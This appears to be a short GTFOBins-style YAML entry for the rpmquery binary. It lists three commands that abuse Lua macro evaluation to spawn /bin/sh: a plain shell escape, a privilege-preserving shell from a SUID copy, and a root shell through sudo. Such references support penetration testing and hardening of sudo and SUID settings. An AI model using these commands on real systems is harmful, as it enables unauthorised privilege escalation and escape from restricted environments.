---
functions:
  execute-interactive:
    - code: rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
  suid-enabled:
    - code: ./rpmquery --eval '%{lua:posix.exec("/bin/sh", "-p")}'
  sudo-enabled:
    - code: sudo rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
---
